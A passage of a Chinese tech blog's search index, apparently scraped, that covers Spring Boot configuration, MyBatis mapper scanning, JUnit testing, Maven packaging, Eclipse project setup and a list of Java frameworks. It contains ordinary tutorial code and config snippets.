和 application.yml 都可以用来配置参数 bootstrap.yml 用来程序引导时执行，应用于更加早期配置信息读取，可以理解成系统级别的一些参数配置，这些参数一般是不会变动的，一旦 bootStrap.yml 被加载，则内容不会被覆盖 application.yml 用来定义应用级别的配置参数，即应用程序特有的配置信息，可以用来配置后续各个模块中需使用的公共参数等。如果加载的 application.yml 的内容标签与 bootstrap.yml 的标签一致，那么 application.yml 会覆盖 bootstrap.yml, 而 application.yml 里面的内容可以动态替换 典型应用场景 一些加密 / 解密的场景 一些固定的不能被覆盖的属性 当使用 Spring Cloud Config Server 的时候，应该在 bootstrap.yml 里面指定 spring.application.name 和 spring.cloud.config.server.git.uri。这是因为当使用 Spring Cloud 的时候，配置信息一般是从 Config Server 加载的，为了取得配置信息（比如密码等），需要一些提早的或引导配置。因此，把 Config Server 信息放在 bootstrap.yml，用来加载真正需要的配置信息。 扫描父模块的 Mapper 接口与 XML 映射文件假设有 common 和 shop 两个模块，common 模块里有 MyBatis 的 Entity 类、Mapper 接口和 XML 映射文件，而 shop 模块则依赖了 common 模块，此时若在 shop 模块中无法注入 common 模块的 Mapper，则可以参考以下方法解决问题。 第一步，先让 shop 模块可以正常扫描到 common 模块的 XML 映射文件和 Entity 类，shop 模块的 YAML 配置内容如下： 123mybatis: mapper-locations: classpath*:/mapper/**/*.xml type-aliases-package: com.common.**.entity 提示 值得一提的是，在 shop 模块中的 application.yml 里面，配置 MyBatis 的 mapper-locations 时，若使用的是 classpath，那么只会扫描当前模块的 XML 映射文件，而使用 classpath* 则会扫描所有 Jar 包下的 XML 映射文件。 第二步，在 shop 模块的启动类上添加 @MapperScan 注解，这是为了可以扫描到 common 模块的 Mapper 接口，而且被扫描到的 Mapper 接口，在编译之后都会自动生成相应的实现类。若 common 模块没有在 shop 模块的启动类可以扫描的包或者子包下面，那么还需要在 shop 模块的启动类上添加 @ComponentScan 注解，这样才能让 SpringBoot 扫描到其他模块中的 Bean 类，示例代码如下： 12345678package com.shop;@SpringBootApplication@MapperScan("com.common.**.mapper")@ComponentScan(basePackages = {"com.common"})public class ShopApplication { } 提示 @MapperScan("com.common.mapper")：扫描指定包中的接口 @MapperScan("com.common.*.mapper")：一个 * 代表任意字符串，但只代表一级包，比如可以扫到 com.common.aaa.mapper，不能扫到 com.common.aaa.bbb.mapper @MapperScan("com.common.**.mapper")：两个 * 代表任意数量的包，比如可以扫到 com.common.aaa.mapper，也可以扫到 com.common.aaa.bbb.mapper Spring Boot 单元测试基础使用 引入 Maven 依赖 1234567891011&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.1.18.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt; 添加 @RunWith、@SpringBootTest 注解 123456789@RunWith(SpringRunner.class)@SpringBootTestpublic class SimpleTest { @Test public void doTest() { int num = new Integer(1); Assert.assertEquals(num, 1); }} 其中有两个 runner 可以选择，分别是 SpringRunner 和 SpringJUnit4ClassRunner。如果是在 Junit 4.3 之前，只能选择 SpringJUnit4ClassRunner，如果是 Junit 4.3 之后，建议选择 SpringRunner，其中 SpringRunner 仅仅继承了 SpringJUnit4ClassRunner，没有任何的额外代码。 123456789@RunWith(SpringJUnit4ClassRunner.class)@SpringBootTestpublic class SimpleTest { @Test public void doTest() { int num = new Integer(1); Assert.assertEquals(num, 1); }} 注解说明 @RunWith：标识为 JUnit 的运行环境 @SpringBootTest：获取启动类、加载配置，确定装载 Spring Boot @Test：声明需要测试的方法 @BeforeClass：针对所有测试，只执行一次，且必须被 static void 修饰 @AfterClass：针对所有测试，只执行一次，且必须被 static void 修饰 @Before：每个测试方法运行前都会执行的方法 @After：每个测试方法运行后都会执行的方法 @Ignore：忽略方法 断言测试 断言测试也就是期望值测试，是单元测试的核心，也就是决定测试结果的表达式，Assert 对象中的断言方法如下： Assert.assertEquals：对比两个值相等 Assert.assertNotEquals：对比两个值不相等 Assert.assertSame：对比两个对象的引用相等 Assert.assertArrayEquals：对比两个数组相等 Assert.assertTrue：验证返回是否为真 Assert.assertFlase：验证返回是否为假 Assert.assertNull：验证 Null Assert.assertNotNull：验证非 Null 超时测试 给 @Test 注解设置 timeout 属性即可，时间单位为毫秒： 1@Test(timeout = 1000) 数据库测试 在测试数据操作的时候，若不想让测试数据污染数据库，只需要给测试类或者测试方法添加 @Transactional 注解即可，这样既可以测试数据操作方法，又不会污染数据库，即默认会回滚对数据库的所有写操作。 1234567891011@Test@Transactionalpublic void saveTest() { User user = new User(); user.setName("Adam"); user.setAge(19); user.setPwd("123456"); userRepository.save(user); System.out.println("userId:" + user.getId()); Assert.assertTrue(user.getId()&gt;0);} Web 模拟测试 在 Spring Boot 项目里面可以直接使用 Junit 对 Web 项目进行测试，Spring 提供了 TestRestTemplate 对象，使用这个对象可以很方便的进行请求模拟。Web 测试只需要进行两步操作： 在 @SpringBootTest 注解上设置 webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT，即使用随机端口 使用 TestRestTemplate 类进行 POST 或 GET 请求 12345678910111213@RunWith(SpringRunner.class)@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)public class UserControllerTest { @Autowired private TestRestTemplate restTemplate; @Test public void getName() { String name = restTemplate.getForObject("/name", String.class); Assert.assertEquals("Adam", name); }} 其中 getForObject() 的含义代表执行 GET 请求，并返回 Object 类型的结果，第二个参数表示将返回结果转换为 String 类型，更多的请求方法如下： getForEntity：Get 请求，返回实体对象（可以是集合） postForEntity：Post 请求，返回实体对象（可以是集合） postForObject：Post 请求，返回对象 Spring Boot 的 Maven 使用relativePath 标签spring-boot-starter-parent 是一个特殊的 starter，用来提供 Maven 的默认依赖，使用它之后常用的包可以省去 version 标签，同时也可以解决版本依赖和兼容问题。比如说有些依赖包之间有版本对应，如果版本不对就会出现报错，如果没有这个特殊的 starter，就需要去查找对应的兼容版本，有了这个 starter，对应的版本已经配置完成，这样就不再需要关注依赖的版本兼容问题，开箱即可使用。 123456&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.7.1&lt;/version&gt; &lt;relativePath/&gt;&lt;/parent&gt; &lt;relativePath/&gt; 标签用于指定父模块 pom.xml 文件的查找路径，默认顺序为：relativePath &gt; 本地仓库 &gt; 远程仓库 不配置 &lt;relativePath/&gt; 标签时，默认的查找路径是 ../pom.xml，会从本地路径中查找父模块的 pom.xml 配置 &lt;relativePath/&gt; 后，会从本地仓库查找，本地仓库查找不到就从远程仓库查找 配置 &lt;relativePath&gt;xxx/pom.xml&lt;/relativePath&gt;，会从本地指定的路径查找 两种依赖引入方式第一种引入方式使用 &lt;parent&gt; 标签引入，这种方式无法解决 Maven 的单继承问题。 12345&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.1.RELEASE&lt;/version&gt;&lt;/parent&gt; 第二种引入方式使用 &lt;dependencyManagement&gt; 标签引入，使用这种方式就不用继承父模块，可以解决单继承的问题。这样就可以继承其他父模块，比如自己创建的父模块。 1234567891011&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;2.2.1.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; &lt;dependencyManagement&gt; 标签其实就相当于一个对 Jar 包版本进行管理的依赖管理器，如果在外面的 &lt;dependency&gt; 标签内没有找到 version 属性，Maven 就会去 &lt;dependencyManagement&gt; 标签内查找相应的版本信息。如果既使用了 &lt;dependencyManagement&gt; 标签，又在外面的 &lt;dependency&gt; 标签内指定了 version 属性，那边 Maven 会以外面的 &lt;dependency&gt; 标签内的 version 属性为准的，所以不用担心使用 &lt;dependencyManagement&gt; 标签后无法自行指定依赖的版本信息。 多模块互相引用打包运行找不到类Spring Boot 模块打包成可执行的 Jar 包，同时被其他模块所依赖，在 IDEA 里项目运行一切正常，但使用 java -jar 命令启动其他模块时，会出现找不到依赖模块中的类的错误？这是由于还没有搞清楚可执行 Jar 和普通 Jar 到底有什么区别导致的。 可执行 Jar 与普通 Jar 的区别 普通 Jar 包：可以被其他项目应用依赖，不可以使用命令 java -jar xxx.jar 运行 可执行 Jar 包：不可以被其他项目应用依赖，可以使用命令 java -jar xxx.jar 运行 特别注意：Spring Boot 项目默认打包的是可执行 Jar 包，普通项目默认打包的是不可执行的 Jar 包，但是普通项目也可以打包成可执行 Jar 包。 Spring Boot 打包插件介绍Spring Boot 项目默认的打包插件是 ​​spring-boot-maven-plugin，这个打包插件存在五个方面的功能，如下:​​ 五个功能分别是： ​​build-info​​：生成项目的构建信息文件 ​​build-info.properties​​ ​​repackage​​：这个是默认 goal，在 ​​mvn package​​ 执行之后，这个命令会再次打包生成可执行的 Jar 包，同时将 ​​mvn package​​ 生成的 Jar 包重命名为 ​​*.original run：这个可以用来运行 Spring Boot 应用 start：这个在 ​​mvn integration-test​​ 阶段，进行 Spring Boot 应用生命周期的管理 stop：这个在 ​​mvn integration-test​​ 阶段，进行 Spring Boot 应用生命周期的管理 若要使用 Spring Boot 打包插件的 repackage 功能，可参考以下的配置内容。同样的，若要使用其他功能，也需要开发者显式配置。 1234567891011121314&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;repackage&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt;&lt;/build&gt; Spring Boot 打包过程分析Spring Boot 的 repackage 功能的作用，就是在打包的时候，多做一点额外的事情： 第一步：mvn package 命令对项目进行打包，打成一个普通的 Jar 包，它可以被其他项目依赖，但是不可以被执行 第二步：repackage 命令，再次打包项目，将之打成一个可执行 Jar 包，并将第一步生成的 Jar 包重命名为 *.original 文件 在项目的 target 目录下可以看到有两个文件，auth.jar 是可执行 Jar 包，auth.jar.original 是被重命名的可依赖的 Jar 包，如下图所示。 在可执行 Jar 包中，有一个 ​​META-INF​​ 的目录，该目录下有一个 ​​MANIFEST.MF​​ 文件，其中的文件内容如下： 12345678910Manifest-Version: 1.0Created-By: Maven Archiver 3.4.0Build-Jdk-Spec: 11Implementation-Title: authImplementation-Version: 1.0-SNAPSHOTMain-Class: org.springframework.boot.loader.JarLauncherStart-Class: com.clay.auth.AuthApplicationSpring-Boot-Version: 2.2.6.RELEASESpring-Boot-Classes: BOOT-INF/classes/Spring-Boot-Lib: BOOT-INF/lib/ 在不可执行 Jar 包中，也存在 META-INF/MANIFEST.MF 文件，但是文件中没有定义启动类等配置信息，其中的文件内容如下： 12345Manifest-Version: 1.0Created-By: Maven Archiver 3.4.0Build-Jdk-Spec: 11Implementation-Title: authImplementation-Version: 1.0-SNAPSHOT 值得一提的是，不可以执行 Jar 包不会将项目的依赖一起打包进去。两个 Jar 包的内部结构是完全不同的，因此一个可以直接执行，另一个则可以被其他项目依赖。 同时打包成两个 Jar 包一般来说，Spring Boot 项目直接打包成可执行 Jar 就可以了，不建议将 Spring Boot 项目作为普通的 Jar 被其他的项目所依赖。如果有这种需求，建议将被依赖的部分，单独抽出来做一个普通的 Maven 模块，然后在其他项目中引用这个 Maven 模块。如果希望 Spring Boot 的 Maven 插件同时生成可执行 Jar 包和普通可依赖的 Jar 包，可以使用以下的插件配置内容： 1234567891011&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;classifier&gt;exec&lt;/classifier&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; ​​classifier​​ 表示可执行 Jar 包的文件后缀名称，这样在执行 ​​repackage​​ 命令时，就不会给 ​​mvn package​​ 命令所打成的 Jar 包重命名为 *.original 文件。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 开发随笔"},{title:"Eclipse 创建基于 Maven 的 Web 项目（动态）",url:"/posts/103477a2.html",text:'前言本文主要介绍如何使用 Eclipse 创建基于 Maven 的 Web 项目（动态），适用于任何版本的 Eclipse。 快速开始创建 Maven Web 项目 创建 Maven 项目，并自定义工作空间的位置 选择 Web 项目的骨架 设置 Group Id 和 Artifact Id 提示 Group Id：项目组织唯一的标识符，实际对应 Java 的包的结构，是 main 目录里 java 的目录结构 Artifact Id：项目的唯一的标识符，实际对应项目的名称，就是项目根目录的名称 完善项目的目录结构创建 java 目录选中项目 -&gt; 右击 -&gt; Properties - Java Builder Path -&gt; Libraries -&gt; JRE System Library -&gt; Edit -&gt; 选中 Alternate JRE -&gt; 选择本地的 JDK 版本 -&gt; Finish –&gt; Apply -&gt; Apply and Close 完成上述步骤后，在项目内会自动显示出 src/main/java 和 src/test/java 目录。这些目录并不是没有创建而是默认被隐藏了，由于创建 Maven 项目时使用了 Eclipse 里的默认模板，而默认模板的 JRE 版本比较低，默认被设置为隐藏造成的，详细说明请看这里。 创建 resources 目录选中项目 -&gt; 右击 -&gt; New -&gt; Source Folde，然后手动创建以下的资源文件目录： src/main/resources src/test/resources 完善后的项目目录结构 配置 Maven Web 项目更改 JDK 的版本在 Maven 的 pom.xml 配置文件里添加以下内容： 12345678910111213141516&lt;properties&gt; &lt;maven.compiler.source&gt;11&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;11&lt;/maven.compiler.target&gt;&lt;/properties&gt;&lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;3.0&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;11&lt;/source&gt; &lt;target&gt;11&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt;&lt;/plugins&gt; 更改 Servlet 的版本在 Maven 的 pom.xml 配置文件里添加以下内容： 123456 &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.0.1&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt; 更改 web.xml 配置文件选中项目 -&gt; 右击 -&gt; Properties -&gt; Project Facets -&gt; 将 Dynamic Web Module 前边的勾去掉，然后修改为 3.0 版本 -&gt; 再修改 Java 的版本 -&gt; Apply 再次勾选 Dynamic Web Module 前边的勾，下边会立刻出现一个 Further configuration available 超链接，然后点击它 更改 Content directory 的路径，并勾选要求生成 web.xml 配置文件，然后点击 OK 按钮 最后编辑 web.xml 配置文件，将下边的代码替换掉原有的配置内容 12345678&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;web-app version="3.0" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://JAVA.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"&gt; &lt;/web-app&gt; 运行 Maven Web 项目添加 Tomcat 运行环境选中项目 -&gt; 右击 -&gt; Properties -&gt; Server -&gt; Runtime Environments -&gt; Add 选择 Tomcat 服务器的目标版本，然后点击 Next 按钮 选择本地 Tomcat 服务器所在的位置，最后点击 Finish -&gt; Apply and Close 按钮 部署项目到 Tomcat 服务器创建本地的 Tomcat 服务器 选择 Tomcat 服务器的目标版本，并选中上面已创建的 Tomcat 运行环境 将项目移动到本地的 Tomcat 服务器 点击 Finish 按钮完成配置 Tomcat 服务器运行 Web 项目选中项目 -&gt; 右击 -&gt; Run As -&gt; Run on Server -&gt; 选择本地的 Tomcat 服务器 -&gt; Finish 项目成功启动后，Eclipse 的控制台会输出如下的日志信息 打开浏览器访问 http://localhost:8080/ssm-study，其中的 ssm-study 是项目名称 最终的项目目录结构 参考博客 Eclipse 创建 Maven 的 Web 项目 使用 Eclipse 创建 Maven 的 Web 项目 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"SpringBoot 与 SpringCloud 介绍",url:"/posts/cd6beb9c.html",text:'SpringBootSpringBoot 站点 SpringBoot 官网 SpringBoot 官方文档 SpringBoot Github 项目 SpringBoot 示例源码 SpringBoot 特性 创建独立的 Spring 应用程序 嵌入的 Tomcat，无需部署 WAR 文件，适用于准生产环境 简化 Maven 配置 自动配置 Spring 提供生产就绪型功能，如指标、健康检查、外部配置 开箱即用，无需 XML 配置 SpringBoot 核心模块 spring-boot spring-boot-autoconfigure spring-boot-starters spring-boot-cli spring-boot-actuator spring-boot-actuator-autoconfigure spring-boot-test spring-boot-test-autoconfigure spring-boot-loader spring-boot-devtools SpringCloudSpringCloud 站点 SpringCloud Github SpringCloud 官方文档 SpringCloud 中文文档 SpringCloud 中国社区 SpringCloud 学习资源 SpringCloud 教程源码 SpringCloud 示例源码 SpringCloud 是什么SpringCloud 是一系列框架的有序集合。它利用 SpringBoot 的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、消息总线、负载均衡、断路器、数据监控等，同时很方便做到一键启动和部署。SpringCloud 并没有重复制造轮子，它只是将目前各家公司开发的比较成熟、经得起实际考验的服务框架组合起来，通过 SpringBoot 风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。其中 SpringCloud 为开发人员提供了快速构建分布式系统中一些常见模式的工具（例如配置管理，服务发现，断路器，智能路由，微代理，控制总线，一次性令牌，全局锁定，领导选举，分布式会话，集群状态）。它们适用于任何分布式环境，包括开发人员自己的笔记本电脑，裸机数据中心和 Cloud Foundry 等托管平台。 SpringBoot 与 SpringCloud 的关系 SpringBoot 专注于快速、方便的开发单个微服务个体，SpringCloud 则关注全局的服务治理 SpringCloud 将 SpringBoot 开发的一个个单体微服务整合并管理起来，为各个微服务之间提供配置管理、服务发现、断路器、路由、微代理、事件总线、全局锁、决策竞选、分布式会话等集成的服务 SpringBoot 可以离开 SpringCloud 独立使用开发项目，但是 SpringCloud 离不开 SpringBoot，属于依赖的关系 SpringCloud 组件SpringCloud 提供一整套的微服务解决方案，生态内大概有 21 个组件；大致可分成两类，一类是对现有成熟框架 ”SpringBoot 化” 的封装和抽象，也是数量最多的项目；第二类是开发了一部分分布式系统的基础设施的实现，如 Spring Cloud Stream 扮演的就是 Kafka、ActiveMQ 这样的角色。对于想快速实践微服务的开发者来说，第一类组件就已经足够使用，如： Spring Cloud Netflix，是对 Netflix 开发的一套分布式服务框架的封装，包括服务的发现和注册，负载均衡、断路器、REST 客户端、请求路由等 Spring Cloud Config，将配置信息中央化保存，配置 Spring Cloud Bus 可以实现动态修改配置文件 Spring Cloud Bus，分布式消息队列，是对 Kafka、MQ 的封装 Spring Cloud Security，对 Spring Security 的封装，并能配合 Netflix 使用 Spring Cloud Zookeeper，对 Zookeeper 的封装，使之能配置其它 Spring Cloud 的子项目使用 Spring Cloud Eureka，是 Spring Cloud Netflix 微服务套件中的一部分，它基于 Netflix Eureka 做了二次封装，主要负责完成微服务架构中的服务治理功能 SpringCloud 常用组件 Spring Cloud Config：配置管理开发工具包，可以让你把配置放到远程服务器，目前支持本地存储、Git 以及 Subversion Spring Cloud Bus：事件、消息总线，用于在集群（例如，配置变化事件）中传播状态变化，可与 Spring Cloud Config 联合实现热部署 Spring Cloud Netflix：针对多种 Netflix 组件提供的开发工具包，其中包括 Eureka、Hystrix、Zuul、Archaius 等 Netflix Eureka：云端负载均衡，一个基于 REST 的服务，用于定位服务，以实现云端的负载均衡和中间层服务器的故障转移 Netflix Hystrix：容错管理工具，旨在通过控制服务和第三方库的节点，从而对延迟和故障提供更强大的容错能力 Netflix Zuul：边缘服务工具，是提供动态路由，监控，弹性，安全等的边缘服务 Netflix Archaius：配置管理 API，包含一系列配置管理 API，提供动态类型化属性、线程安全配置操作、轮询框架、回调机制等功能 Spring Cloud for Cloud Foundry：通过 Oauth2 协议绑定服务到 CloudFoundry，CloudFoundry 是 VMware 推出的开源 PaaS 云平台 Spring Cloud Sleuth：日志收集工具包，封装了 Dapper、Zipkin 和 HTrace 操作 Spring Cloud Data Flow：大数据操作工具，通过命令行方式操作数据流 Spring Cloud Security：安全工具包，为你的应用程序添加安全控制，主要是指 OAuth2 Spring Cloud Consul：封装了 Consul 操作，Consul 是一个服务发现与配置工具，与 Docker 容器可以无缝集成 Spring Cloud Zookeeper：操作 Zookeeper 的工具包，用于使用 Zookeeper 方式的服务注册和发现 Spring Cloud Stream：数据流操作开发包，封装了与 Redis、RabbitMQ、Kafka 等发送接收消息 Spring Cloud CLI：基于 Spring Boot CLI，可以让你以命令行方式快速建立云组件 SpringCloud 组件概览图 SpringCloud 架构图集SpringCloud 架构图 SpringCloud Alibaba 技术中台架构图 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Eclipse 安装插件",url:"/posts/5c9b0a47.html",text:'Eclipse 在线安装阿里巴巴 Java 开发规约插件 打开 Eclipse –&gt; Help –&gt; Install New Software，填写插件的 URL 地址： https://p3c.alibaba.com/plugin/eclipse/update， 然后根据界面提示一步步安装，最后重启 Eclipse。安装成功后，工具栏会新增下图所示的图标。可以通过右键菜单、Toolbar 按钮两种方式手动触发代码检测，同时结果面板中可以对部分实现了 QuickFix 功能的规则进行快速修复。 Eclipse 在线安装 SpringBoot 插件（Spring Tools） 查看 Eclipse 版本，打开 Eclipse –&gt; Help –&gt; About Eclipse。 在 SpringBoot 官网，根据自己的 Eclipse 版本号获取对应的插件 URL 地址。 打开 Eclipse –&gt; Help –&gt; Install New Software，填写插件的 URL 地址，点击 SelectAll 按扭选择安装所有组件，然后取消左下角 Cntact all update site… 这个选项的勾选，否则安装过程会非常缓慢。安装过程中，若提示下图中的组件更新，直接选择 Keep my installation，然后根据界面提示一步步安装，最后重启 Eclipse。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Java 技术分类汇总（持续更新中）",url:"/posts/8cbb7cbe.html",text:'技术选型原则业务驱动技术，技术的出现是为了更好地支撑业务，离开业务谈技术都是耍流氓。选型维度可参考以下几方面：框架成熟度、社区热度、可维护性、开发效率、运行效率、成功案例、文档丰富程度、学习曲线。 常用类库、框架SQL 优化：P6Spy Bean 映射工具：Dozer Java 诊断工具：Arthas Web 爬虫：Webmagic、Jsoup Binlog 解析工具：Maxwell、Canal 数据导出：POI、EasyPOI、EasyExcel 动态代理：Byte Buddy、Cglib、ASM、Javassist、JDK 代码混淆：Zelix KlassMaster 代码测试：Mockito、Jacoco Reids 客户端：Jedis、Lettuce、Redisson 权限安全：Shiro、Spring Security 搜索引擎：Lucene、Solr、ElasticSearch、Redis Stack（RediSearch） 数据库连接池：C3P0、DBCP、Druid、HikariCP、BeeCp HTTP 请求：OkHttp、Retrofit、Apache HttpClient 限流：Bucket4j、RateLimitJ、RateLimiter（Guava） 模版引擎：FreeMarker、Thymeleaf、Velocity、Beetl、Enjoy 工具库：Guava、Apache Commons、Joda Time、Hutool API 文档：Spring REST Docs、Knife4j、Swagger2、OpenAPI3 响应式编程：RxJava、Reactor、Vert.x、Akka Streams、Ratpack 序列化：ProtoBuf、Thrift、Kryo、FST、Gson、FastJson、Jackson、Hessian 缓存：Ehcache、Caffeine 、Spring Cache、Guava Cache、JetCache、Hazelcast、Infinispan、J2Cache ORM 框架：JPA、Hibernate、MyBatis、MyBatis-Plus、TKMybatis、BeetlSQL、APIJSON 基础开发框架：Struts2、Spring、Spring MVC、Spring WebFlux、JFinal 高可用、高性能、高并发、高扩展、分布式、微服务技术微服务：Spring Boot、Spring Cloud、Spring Cloud Alibaba、Quarkus、Helidon、Micronaut、GraalVM 分布式锁：Redission、ZooKeeper、Chubby RPC 框架：gRPC、Thrift、Dubbo、Sofa-RPC、Motan、ZBUS、HSF 服务监控：Spring Boot Admin、Prometheus、Metrics、Grafana、Cacti、Zabbix、Nagios、Cat、Atlas、Spectator、Open Falcon 消息队列：Kafka、RabbitMQ、ActiveMQ、RocketMQ、ZeroMQ、RedisMQ、Beanstalkd、ZUBS 全链路跟踪：Zipkin、Sleuth、SkyWalking、Pinpoint、Brave、Dapper、JVM-SANDBOX 服务注册与发现：Zookeeper、Eureka、Nacos、SOFARegistry、Consul、Etcd3、Istio 数据库迁移：Flyway、Liquibase 分布式任务调度：Elastic-Job、XXL-JOB、Saturn、DolphinScheduler 分布式统一配置中心：Spring Cloud Config、Consul、Zookeeper、Nacos、Apollo、Etcd3、Disconf、Chef 分布式文件系统：HDFS、FastDFS、MinIO、TFS、GlusterFS、Ceph、MooseFS 服务路由（API 网关）：Gateway、Zuul、Kong、OpenResty、ShenYu、Envoy、Higress、Linkerd、Tyk、Orange 服务熔断、服务降级：Hystrix、Sentinel、Resilience4j、Enovy 数据库中间件：MyCat、Sharding-JDBC、ShardingSphere、SOFA、Canal、TongWeb、Cobar、Atlas、DBProxy、Heisenberg、CDS、DDB、OneProxy、Amoeba、Vitess 数据库：MySQL、PostgreSQL、MongoDB、HBase、Ignite、Oracle、DB2、SQL Server、Cassandra、MinIO 内存数据库：Redis、Memcached、Couchbase 嵌入式数据库：SQLite、H2、Derby、HSQL 大数据技术：Spark 生态圈、Hadoop、HDFS、Zookeeper、Yarn、Hive、Hbase、Storm、Flume、Sqoop、Impala、ClickHouse、Flink 大数据任务调度：Azkaban、Oozie、Airflow、DolphinScheduler 分布式事务：Seata、TxLcn、RabbitMQ 柔性事务 分布式全局唯一 ID：SnowFlake、UidGenerator、Leaf 分布式系统其他基础技术：CAS 单点登录、分布式 Session 分布式数据库其他基础技术：数据库集群、主从同步、读写分离、分库分表、分片分区 Linux、编译构建、持续集成、虚拟化技术编译构建：Maven、Gradle、Ant、Bazel Linux 系统：CentOS、Debian、Ubuntu、SUSE 持续集成：Jenkins、Hudson、Bamboo、Spinnaker Web 服务器：Apache、Tomcat、Jetty、Undertow、Weblogic、Websphere、TomEE、Resin、WildFly、GlassFish、Payara 虚拟化：Docker、Swarm、Machine、Compose、Kubernetes、Mesos（Day2IQ）、Rancher、Podman、K3S、Skopeo、Buildah、Rancher2、Portainer、Proxmox 负载均衡、反向代理、缓存服务器：LVS、Nginx、Tengine、OpenResty、Caddy、Envoy、HAProxy、Keepalived、Heartbeat、Varnish、Squid var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", 